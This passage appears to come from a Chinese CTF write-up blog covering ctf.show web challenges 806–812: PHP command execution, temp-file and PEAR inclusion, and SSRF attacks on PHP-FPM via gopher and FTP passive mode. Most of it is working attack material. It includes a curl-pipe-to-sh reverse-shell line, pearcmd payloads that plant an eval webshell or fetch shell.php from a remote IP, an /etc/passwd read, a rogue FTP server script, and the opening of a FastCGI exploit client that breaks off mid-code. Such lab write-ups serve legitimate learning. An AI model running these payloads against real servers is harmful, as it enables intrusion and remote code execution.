class="line">show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));</span><br></pre></td></tr></table></figure><h1 id="web807（shell反弹）"><a href="#web807（shell反弹）" class="headerlink" title="web807（shell反弹）"></a>web807（shell反弹）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$schema</span> = substr(<span class="variable">$url</span>,<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$schema</span>===<span class="string">&quot;https://&quot;</span>)&#123;</span><br><span class="line">    shell_exec(<span class="string">&quot;curl <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接进行shell反弹也可以利用群主的网站进行反弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/ip port |sh</span><br></pre></td></tr></table></figure><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl命令</a><br><a href="https://www.jianshu.com/p/9456473a0a14">linux下反弹shell的方法</a></p><h1 id="web808（卡临时文件包含）"><a href="#web808（卡临时文件包含）" class="headerlink" title="web808（卡临时文件包含）"></a>web808（卡临时文件包含）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> php版本 7.0，有完整的包含点，并且参数可控，/tmp目录可写<br> 还需要得到上传的文件名</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>php在上传文件时候会先保存在临时目录，在php脚本运行完后自动删除<br><img src="https://img-blog.csdnimg.cn/2001c08d75824d0c96a3666654834e5b.png"><br>其实就是让程序崩溃的同时上传文件，那么文件就会留在/tmp目录下。但是这种方法要知道文件名，要不然爆破起来也是挺麻烦的。<br>如果过滤了filter伪协议也可以包含自身来崩溃。</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>先创建一个上传表单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form action=<span class="string">&quot;http://2af23aac-f3d7-45fa-a482-e46c74ea93ad.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">            &lt;br /&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>记得修改域名<br>之后对其抓包并发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/d3aa85daa5b94cbabdde58ab3d19f208.png"><br>之后返回原题刷新后会发现临时文件已经保存<br><img src="https://img-blog.csdnimg.cn/e0e771de7ba24dbe989c11b6cac26fac.png"><br>之后访问并利用即可得到flag</p><h1 id="web809（pear文件包含-RCE）"><a href="#web809（pear文件包含-RCE）" class="headerlink" title="web809（pear文件包含/RCE）"></a>web809（pear文件包含/RCE）</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p><img src="https://img-blog.csdnimg.cn/e353c6f603fe499d8e4253953da597cf.png"></p><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>看<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">大佬博客</a><br>从中可以得到paylaod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/<span class="built_in">local</span>/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>在这我们稍作修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/<span class="built_in">local</span>/lib/php/pearcmd.php&amp;+config-create+/&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;+/tmp/xin.php</span><br><span class="line">或</span><br><span class="line">?file=/usr/<span class="built_in">local</span>/lib/php/pearcmd.php&amp;aaa+install+-R+/var/www/html/+http://IP/shell.php</span><br></pre></td></tr></table></figure><p>传入即可(利用bp进行传入)</p><p>第二个成功需要在自己的vps上写文件<br><img src="https://img-blog.csdnimg.cn/b18db47fbe2d4dc489c8b6ac4dafabcd.png"><br><img src="https://img-blog.csdnimg.cn/928dd06f1b9f47bbb516a513105c29b3.png"><br>之后访问<br><img src="https://img-blog.csdnimg.cn/b17f23847d5a42ea948cdb517dc522d1.png"><br>第三个姿势<br><img src="https://img-blog.csdnimg.cn/33630c4a0e99406f9990d91a7794c845.png"></p><h1 id="web810"><a href="#web810" class="headerlink" title="web810"></a>web810</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>Libcurl版本：高于7.45.0<br>PHP-FPM：监听端口，版本高于5.3.3<br>知道目标机器上任意一个php文件绝对路径</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><a href="https://www.cnblogs.com/followyou/p/9460058.html">php-fpm</a><br>工具下载地址<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br>打fastcgi用法：<br>python gopherus.py –exploit fastcgi<br><img src="https://img-blog.csdnimg.cn/371ba9a3f5d942b6ad065df3f556114a.png"><br>最后将生成的payload下划线后面的url编码，也即gopher://127.0.0.1:9000/_后面的全部url编码<br><a href="https://www.freebuf.com/articles/web/292437.html">SSRF漏洞之FastCGI利用篇</a><br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">p神讲解</a></p><h1 id="web811（FTP的被动模式打FPM漏洞代码）"><a href="#web811（FTP的被动模式打FPM漏洞代码）" class="headerlink" title="web811（FTP的被动模式打FPM漏洞代码）"></a>web811（FTP的被动模式打FPM漏洞代码）</h1><p>本题考察FTP的被动模式打FPM漏洞代码<br><a href="https://www.anquanke.com/post/id/254387">FTP的被动模式打FPM漏洞代码</a><br>上面文章是反弹shell了，但是我没有成功（泪奔）<br>于是我利用curl进行命令执行<br>首先利用vps搭建恶意的ftp服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">4566</span>)) <span class="comment">#端口可改</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后利用gopherus生成payload<br><img src="https://img-blog.csdnimg.cn/a860a9b4d10b43ba88e2301f83464aaf.png"><br>vps监听4438端口<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=ftp://x.x.x.x:4566&amp;content=gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9e3780d8e5994cb1afbca7b8f0303cfe.png"><br>得到flag</p><h1 id="web812（PHP-FPM未授权）"><a href="#web812（PHP-FPM未授权）" class="headerlink" title="web812（PHP-FPM未授权）"></a>web812（PHP-FPM未授权）</h1><p>利用p神的脚本，详解在810中p神博客中有介绍原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += 